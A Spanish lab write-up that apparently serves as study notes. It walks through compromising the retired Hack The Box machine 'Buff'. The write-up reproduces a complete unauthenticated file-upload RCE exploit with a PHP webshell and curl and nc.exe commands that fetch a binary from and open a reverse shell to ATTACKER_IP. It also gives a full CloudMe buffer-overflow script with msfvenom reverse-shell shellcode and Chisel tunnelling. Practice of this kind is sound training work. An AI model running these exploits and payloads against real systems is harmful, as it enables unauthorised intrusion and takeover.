---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - RCE
  - ReverseShell
  - BufferOverflow
  - MSF
  - Pivoting
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Identificación del sistema|Identificación del sistema]]
	- [[#Enumeración#Escaneo de puertos|Escaneo de puertos]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Unauthenticated RCE|Unauthenticated RCE]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Buffer Overflow|Buffer Overflow]]
		- [[#Buffer Overflow#Searchsploit|Searchsploit]]
		- [[#Buffer Overflow#MSFvenom|MSFvenom]]
		- [[#Buffer Overflow#Pivoting con Chisel|Pivoting con Chisel]]

---
# Buff

![](Screenshots/Pasted%20image%2020260421123104.png)

>Máquina retirada de Hack The Box llamada **[Buff](https://app.hackthebox.com/machines/Buff)**, que presenta un entorno **Windows** con un **servidor web vulnerable**.  
>La explotación comienza con la enumeración de un servicio **HTTP** que utiliza _Gym Management System 1.0_, el cual es vulnerable a una **subida de archivos sin autenticación** que permite **ejecución remota de código (RCE)**.  
>Tras obtener acceso inicial mediante una **webshell** y estabilizarla con una **reverse shell**, se realiza una enumeración interna que revela un **servicio local vulnerable** de _CloudMe Sync_.  
>Mediante el uso de **tunneling con Chisel** se accede a este servicio en **localhost**, explotando un **buffer overflow** que permite escalar privilegios hasta **Administrator**.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.25.107
PING 10.129.25.107 (10.129.25.107) 56(84) bytes of data.
64 bytes from 10.129.25.107: icmp_seq=1 ttl=127 time=45.3 ms

--- 10.129.25.107 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.316/45.316/45.316/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Escaneo de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.25.107 -oG allPorts
PORT     STATE SERVICE    REASON
7680/tcp open  pando-pub  syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127
```

```PowerShell
nmap -p7680,8080 -sCV 10.129.25.107 -oN targeted
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

Se identifican los puertos:
- **8080 → HTTP**
- **7680 → Servicio adicional**
### HTTP

```HTTP
http://10.129.25.107:8080/index.php
```

![](Screenshots/Pasted%20image%2020260421084712.png)

![](Screenshots/Pasted%20image%2020260421123611.png)

Se identifica el uso de **Gym Management System 1.0** revisando el contenido de la aplicación.
### Searchsploit

Se realiza una búsqueda de vulnerabilidades.

```PowerShell
searchsploit "Gym Management"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                                                                                                                                            | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                                                                                         | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                                                                                                   | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                                                                                         | php/webapps/48506.py
GYM MS - GYM Management System - Cross Site Scripting (Stored)                                                                                                                                            | php/webapps/51777.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

De todas las vulnerabilidades, la más interesante es la RCE no autenticada, ya que permite ejecución remota sin credenciales, lo que la convierte en el vector más directo de compromiso.

Se observa el exploit `Gym Management System 1.0 - Unauthenticated Remote Code Execution`.

---
## Explotación
### Unauthenticated RCE

Se obtiene el exploit:

`searchsploit -m php/webapps/48506.py`

Se visualiza el script.

```PowerShell
# Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
# Exploit Author: Bobby Cooke
# Date: 2020-05-21
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://projectworlds.in/free-projects/php-projects/gym-management-system-project-in-php/
# Version: 1.0
# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
# Exploit Tested Using: Python 2.7.17
# Vulnerability Description:
#   Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
# Exploit Details:
#   1. Access the '/upload.php' page, as it does not check for an authenticated user session.
#   2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
#     - `upload.php?id=kamehameha`
#     /upload.php:
#        4 $user = $_GET['id'];
#       34       move_uploaded_file($_FILES["file"]["tmp_name"],
#       35       "upload/". $user.".".$ext);
#   3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
#     /upload.php:
#        5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
#        6 $extension = @end(explode(".", $_FILES["file"]["name"]));
#       14 && in_array($extension, $allowedExts))
#   4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request, and set the 'pupload' paramter to 'upload'.
#        7 if(isset($_POST['pupload'])){
#        8 if ((($_FILES["file"]["type"] == "image/gif")
#       11 || ($_FILES["file"]["type"] == "image/png")
#   5. In the body of the 'file' parameter of the POST request, insert the malicious PHP code:
#       <?php echo shell_exec($_GET["telepathy"]); ?>
#   6. The Web Application will rename the file to have the extension with the second item in an array created from the file name; seperated by the '.' character.
#       30           $pic=$_FILES["file"]["name"];
#       31             $conv=explode(".",$pic);
#       32             $ext=$conv['1'];
#   - Our uploaded file name was 'kaio-ken.php.png'. Therefor $conv['0']='kaio-ken'; $conv['1']='php'; $conv['2']='png';
#   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.

import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["telepathy"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
    webshell(SERVER_URL, s)% 
```

La vulnerabilidad permite subir archivos PHP maliciosos sin autenticación.

El bypass se realiza mediante:
- Doble extensión (`.php.png`)
- Manipulación del `Content-Type` (`image/png`)
- Inclusión de código PHP en el archivo

Se ejecuta el exploit.

```PowerShell
python2 48506.py 'http://10.129.25.107:8080/'
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload> 
```

Aunque el exploit automatizado funciona, la salida contiene bytes corruptos (`PNG`) debido a los *magic bytes*, por lo que se opta por usar la webshell manualmente.

Observando el código fuente del script. Sube un archivo llamado `kamehameha.php` al directorio `/upload` y con el parámetro `telepathy` podemos ejecutar comandos.

```HTTP
http://10.129.25.107:8080/upload/kamehameha.php?telepathy=ipconfig
�PNG


Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::7cc5:ad6e:86d2:6b34
   Temporary IPv6 Address. . . . . . : dead:beef::142b:7626:ef93:ce19
   Link-local IPv6 Address . . . . . : fe80::7cc5:ad6e:86d2:6b34%10
   IPv4 Address. . . . . . . . . . . : 10.129.25.107
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:c47%10
                                       10.129.0.1
```
### Reverse Shell

Se descarga `nc.exe` para obtener una reverse shell más estable:

```PowerShell
locate nc.exe
/usr/share/windows-resources/binaries/nc.exe

cp /usr/share/windows-resources/binaries/nc.exe .

python3 -m http.server
```

```HTTP
http://10.129.25.107:8080/upload/kamehameha.php?telepathy=curl ATTACKER_IP:8000/nc.exe -o nc.exe
```

Se observa en el servidor `http` que hemos abierto se ha realizado un `GET`.

```PowerShell
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.25.107 - - [                    ] "GET /nc.exe HTTP/1.1" 200 -
```

Se ejecuta `nc.exe` para establecer una reverse shell hacia nuestra máquina atacante.

```PowerShell
nc -nlvp 1234
```

```HTTP
http://10.129.25.107:8080/upload/kamehameha.php?telepathy=nc.exe ATTACKER_IP 1234 -e cmd
```

Se obtiene acceso como:

```PowerShell
buff\shaun
```

La flag de `usuario` se encuentra en: `C:\Users\shaun\Desktop`.

---
## Escalada de Privilegios

Tras obtener acceso inicial al sistema, se realiza una enumeración interna en busca de posibles vectores de escalada de privilegios.
### Buffer Overflow

Se encuentra el archivo: `CloudMe_1112.exe` en la ruta: `C:\Users\shaun\Downloads`.

Es un ejecutable de una versión concreta del cliente de sincronización de archivos de `CloudMe Sync`, en este caso la **v1.11.2**. La versión es conocida porque tiene una **vulnerabilidad de desbordamiento de buffer (buffer overflow)** en uno de sus servicios locales (`8888`).

```PowerShell
netstat -ano | findstr TCP | findstr ":0"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       956
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       7000
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       1380
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       7224
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       520
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1076
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1572
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2316
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       688
  TCP    10.129.25.107:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       8420
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       5172
  TCP    [::]:135               [::]:0                 LISTENING       956
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       1380
  TCP    [::]:8080              [::]:0                 LISTENING       7224
  TCP    [::]:49664             [::]:0                 LISTENING       520
  TCP    [::]:49665             [::]:0                 LISTENING       1076
  TCP    [::]:49666             [::]:0                 LISTENING       1572
  TCP    [::]:49667             [::]:0                 LISTENING       2316
  TCP    [::]:49668             [::]:0                 LISTENING       668
  TCP    [::]:49669             [::]:0                 LISTENING       688
```

Se observa que el puerto `8888` está escuchando en localhost (`127.0.0.1`), lo que indica un servicio interno no accesible externamente.
#### Searchsploit

```PowerShell
searchsploit cloudme
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                                                                                    | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                                                                           | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                                                                           | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                                                                                          | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                                                                                   | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                                                                                            | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                                                                               | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                                                                                           | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                                                                                  | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                                                                                   | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                                                                                | windows_x86-64/remote/44784.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

```PowerShell
searchsploit -m windows/remote/48389.py 
```

```PowerShell
cat 48389.py 
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```

Se utiliza un exploit de **buffer overflow** que sobrescribe el registro **EIP**.

Fragmento relevante:

```python
padding1 = b"\x90" * 1052
EIP = b"\xB5\x42\xA8\x68"  # 0x68A842B5 -> PUSH ESP; RET
NOPS = b"\x90" * 30
payload = b"..."
```

El exploit funciona sobrescribiendo el registro EIP tras enviar 1052 bytes, lo que permite redirigir la ejecución del programa.

El valor de EIP (`0x68A842B5`) corresponde a una instrucción `PUSH ESP; RET`, que redirige el flujo de ejecución hacia la pila, donde se encuentra nuestro payload.

Se utiliza un NOP sled (`\x90`) para aumentar la fiabilidad del exploit, permitiendo que la ejecución caiga en cualquier punto previo al shellcode.
#### MSFvenom

Se genera el payload.

```PowerShell
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.117 LPORT=4455 -b '\x00\x0A\x0D' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1899 bytes
payload =  b""
payload += b"\xbd\xf6\xba\x35\x37\xda\xc0\xd9\x74\x24\xf4"
payload += b"\x5b\x29\xc9\xb1\x52\x83\xc3\x04\x31\x6b\x0e"
payload += b"\x03\x9d\xb4\xd7\xc2\x9d\x21\x95\x2d\x5d\xb2"
payload += b"\xfa\xa4\xb8\x83\x3a\xd2\xc9\xb4\x8a\x90\x9f"
payload += b"\x38\x60\xf4\x0b\xca\x04\xd1\x3c\x7b\xa2\x07"
payload += b"\x73\x7c\x9f\x74\x12\xfe\xe2\xa8\xf4\x3f\x2d"
payload += b"\xbd\xf5\x78\x50\x4c\xa7\xd1\x1e\xe3\x57\x55"
payload += b"\x6a\x38\xdc\x25\x7a\x38\x01\xfd\x7d\x69\x94"
payload += b"\x75\x24\xa9\x17\x59\x5c\xe0\x0f\xbe\x59\xba"
payload += b"\xa4\x74\x15\x3d\x6c\x45\xd6\x92\x51\x69\x25"
payload += b"\xea\x96\x4e\xd6\x99\xee\xac\x6b\x9a\x35\xce"
payload += b"\xb7\x2f\xad\x68\x33\x97\x09\x88\x90\x4e\xda"
payload += b"\x86\x5d\x04\x84\x8a\x60\xc9\xbf\xb7\xe9\xec"
payload += b"\x6f\x3e\xa9\xca\xab\x1a\x69\x72\xea\xc6\xdc"
payload += b"\x8b\xec\xa8\x81\x29\x67\x44\xd5\x43\x2a\x01"
payload += b"\x1a\x6e\xd4\xd1\x34\xf9\xa7\xe3\x9b\x51\x2f"
payload += b"\x48\x53\x7c\xa8\xaf\x4e\x38\x26\x4e\x71\x39"
payload += b"\x6f\x95\x25\x69\x07\x3c\x46\xe2\xd7\xc1\x93"
payload += b"\xa5\x87\x6d\x4c\x06\x77\xce\x3c\xee\x9d\xc1"
payload += b"\x63\x0e\x9e\x0b\x0c\xa5\x65\xdc\x39\x30\x6b"
payload += b"\x69\x56\x46\x73\x80\xc1\xcf\x95\xc8\x1d\x86"
payload += b"\x0e\x65\x87\x83\xc4\x14\x48\x1e\xa1\x17\xc2"
payload += b"\xad\x56\xd9\x23\xdb\x44\x8e\xc3\x96\x36\x19"
payload += b"\xdb\x0c\x5e\xc5\x4e\xcb\x9e\x80\x72\x44\xc9"
payload += b"\xc5\x45\x9d\x9f\xfb\xfc\x37\xbd\x01\x98\x70"
payload += b"\x05\xde\x59\x7e\x84\x93\xe6\xa4\x96\x6d\xe6"
payload += b"\xe0\xc2\x21\xb1\xbe\xbc\x87\x6b\x71\x16\x5e"
payload += b"\xc7\xdb\xfe\x27\x2b\xdc\x78\x28\x66\xaa\x64"
payload += b"\x99\xdf\xeb\x9b\x16\x88\xfb\xe4\x4a\x28\x03"
payload += b"\x3f\xcf\x58\x4e\x1d\x66\xf1\x17\xf4\x3a\x9c"
payload += b"\xa7\x23\x78\x99\x2b\xc1\x01\x5e\x33\xa0\x04"
payload += b"\x1a\xf3\x59\x75\x33\x96\x5d\x2a\x34\xb3"
```

Se modifica el payload del script.

```PowerShell
# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload =  b""
payload += b"\xbd\xf6\xba\x35\x37\xda\xc0\xd9\x74\x24\xf4"
payload += b"\x5b\x29\xc9\xb1\x52\x83\xc3\x04\x31\x6b\x0e"
payload += b"\x03\x9d\xb4\xd7\xc2\x9d\x21\x95\x2d\x5d\xb2"
payload += b"\xfa\xa4\xb8\x83\x3a\xd2\xc9\xb4\x8a\x90\x9f"
payload += b"\x38\x60\xf4\x0b\xca\x04\xd1\x3c\x7b\xa2\x07"
payload += b"\x73\x7c\x9f\x74\x12\xfe\xe2\xa8\xf4\x3f\x2d"
payload += b"\xbd\xf5\x78\x50\x4c\xa7\xd1\x1e\xe3\x57\x55"
payload += b"\x6a\x38\xdc\x25\x7a\x38\x01\xfd\x7d\x69\x94"
payload += b"\x75\x24\xa9\x17\x59\x5c\xe0\x0f\xbe\x59\xba"
payload += b"\xa4\x74\x15\x3d\x6c\x45\xd6\x92\x51\x69\x25"
payload += b"\xea\x96\x4e\xd6\x99\xee\xac\x6b\x9a\x35\xce"
payload += b"\xb7\x2f\xad\x68\x33\x97\x09\x88\x90\x4e\xda"
payload += b"\x86\x5d\x04\x84\x8a\x60\xc9\xbf\xb7\xe9\xec"
payload += b"\x6f\x3e\xa9\xca\xab\x1a\x69\x72\xea\xc6\xdc"
payload += b"\x8b\xec\xa8\x81\x29\x67\x44\xd5\x43\x2a\x01"
payload += b"\x1a\x6e\xd4\xd1\x34\xf9\xa7\xe3\x9b\x51\x2f"
payload += b"\x48\x53\x7c\xa8\xaf\x4e\x38\x26\x4e\x71\x39"
payload += b"\x6f\x95\x25\x69\x07\x3c\x46\xe2\xd7\xc1\x93"
payload += b"\xa5\x87\x6d\x4c\x06\x77\xce\x3c\xee\x9d\xc1"
payload += b"\x63\x0e\x9e\x0b\x0c\xa5\x65\xdc\x39\x30\x6b"
payload += b"\x69\x56\x46\x73\x80\xc1\xcf\x95\xc8\x1d\x86"
payload += b"\x0e\x65\x87\x83\xc4\x14\x48\x1e\xa1\x17\xc2"
payload += b"\xad\x56\xd9\x23\xdb\x44\x8e\xc3\x96\x36\x19"
payload += b"\xdb\x0c\x5e\xc5\x4e\xcb\x9e\x80\x72\x44\xc9"
payload += b"\xc5\x45\x9d\x9f\xfb\xfc\x37\xbd\x01\x98\x70"
payload += b"\x05\xde\x59\x7e\x84\x93\xe6\xa4\x96\x6d\xe6"
payload += b"\xe0\xc2\x21\xb1\xbe\xbc\x87\x6b\x71\x16\x5e"
payload += b"\xc7\xdb\xfe\x27\x2b\xdc\x78\x28\x66\xaa\x64"
payload += b"\x99\xdf\xeb\x9b\x16\x88\xfb\xe4\x4a\x28\x03"
payload += b"\x3f\xcf\x58\x4e\x1d\x66\xf1\x17\xf4\x3a\x9c"
payload += b"\xa7\x23\x78\x99\x2b\xc1\x01\x5e\x33\xa0\x04"
payload += b"\x1a\xf3\x59\x75\x33\x96\x5d\x2a\x34\xb3"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)
```
#### Pivoting con Chisel

El servicio vulnerable solo escucha en localhost (127.0.0.1), por lo que no es accesible remotamente. Para explotarlo, se crea un túnel con [Chisel](https://github.com/jpillora/chisel) que expone el puerto 8888 hacia nuestra máquina atacante.

Linux: [chisel_1.11.5_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz).
Windows: [chisel_1.11.5_windows_amd64.zip](https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_windows_amd64.zip).

Para saber que *Chisel* se tiene que descargar, se realiza un `systeminfo` para ver el tipo de sistema.

```PowerShell
systeminfo

Host Name:                 BUFF
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          shaun
Registered Organization:   
Product ID:                00329-10280-00000-AA218
Original Install Date:     16/06/2020, 15:05:58
System Boot Time:          21/04/2026, 07:44:49
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 18/01/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,666 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,998 MB
Virtual Memory: In Use:    1,801 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\BUFF
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB4565631
                           [02]: KB4486153
                           [03]: KB4494451
                           [04]: KB4561600
                           [05]: KB4562251
                           [06]: KB4565552
                           [07]: KB4565489
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.25.107
                                 [02]: fe80::8996:f31e:46a:a991
                                 [03]: dead:beef::f47e:b723:2477:2503
                                 [04]: dead:beef::8996:f31e:46a:a991
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Se descomprime en Linux y se dan permisos.

```PowerShell
gunzip chisel.gz 
chmod chmod +x chisel 
```

Se descomprime en Windows.

```PowerShell
unzip chisel_1.11.5_windows_amd64.zip 
```

Mediante el comando curl nos pasamos a la máquina Windows el Chisel descomprimido.

Máquina Linux:

```PowerShell
./chisel server --reverse -p 1234
```

Máquina Windows:

```PowerShell
chisel.exe client ATTACKER_IP:1234 R:8888:127.0.0.1:8888
```

Nos ponemos en escucha en el puerto `4455`.

```PowerShell
nc -nlvp 4455
```

Se lanza el exploit.

```PowerShell
python3 48389.py
```

Se obtiene acceso como:

```PowerShell
buff\administrator
```

La flag de `root` se encuentra en `C:\Users\Administrator\Desktop`.

---